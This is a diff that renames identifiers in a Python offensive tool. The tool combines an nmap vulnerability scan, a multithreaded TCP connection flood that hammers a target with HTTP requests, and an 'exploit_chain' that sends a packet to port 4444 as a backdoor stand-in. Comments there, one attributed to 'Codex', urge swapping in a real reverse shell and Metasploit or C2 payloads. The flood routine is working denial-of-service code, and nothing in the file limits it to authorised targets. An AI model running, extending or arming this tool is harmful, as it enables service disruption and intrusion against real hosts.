@@ -13,7 +13,7 @@ import logging
 import threading
 import time
 
-def scan_vulns(target):
+def scan_vulnerabilities(target):
     scanner = nmap.PortScanner()
     print(f"[+] Pressuring target: {target}")
     scanner.scan(target, '1-1024', '-sV --script vuln')
@@ -30,19 +30,19 @@ def scan_vulns(target):
                         print(f"Vuln Script: {script} - {scanner[host][proto][port]['script'][script]}")
 
 def stress_test(target, port=80, threads=50, duration=60):
-    def flood():
+    def send_connection_flood():
         end_time = time.time() + duration
         while time.time() < end_time:
             try:
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                    s.connect((target, port))
-                    s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
-            except (socket.error, OSError) as e:
-                logging.debug("Connection error: %s", e)
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as connection_socket:
+                    connection_socket.connect((target, port))
+                    connection_socket.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
+            except (socket.error, OSError) as error:
+                logging.debug("Connection error: %s", error)
     print(f"[+] Applying pressure to {target}:{port} with {threads} threads for {duration}s")
     max_workers = min(threads, 100)
     with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
-        futures = [executor.submit(flood) for _ in range(threads)]
+        futures = [executor.submit(send_connection_flood) for _ in range(threads)]
         concurrent.futures.wait(futures)
 
 def exploit_chain(target, payload="default_backdoor"):
@@ -50,8 +50,8 @@ def exploit_chain(target, payload="default_backdoor"):
     if payload == "default_backdoor":
         print(f"[+] Injecting backdoor sim on {target} - Codex tip: Replace with real rev-shell")
         # Placeholder: In prod, use metasploit embeds or custom C2
-        pkt = IP(dst=target)/TCP(dport=4444, flags="S")/Raw(load="CHAOS_AWAKEN")
-        send(pkt, verbose=0)
+        packet = IP(dst=target)/TCP(dport=4444, flags="S")/Raw(load="CHAOS_AWAKEN")
+        send(packet, verbose=0)
     else:
         print(f"[+] Custom exploit chain: {payload}")
 
@@ -75,7 +75,7 @@ def main():
     args = parser.parse_args()
 
     if args.command == 'scan':
-        scan_vulns(args.target)
+        scan_vulnerabilities(args.target)
     elif args.command == 'stress':
         stress_test(args.target, args.port, args.threads, args.duration)
     elif args.command == 'exploit':
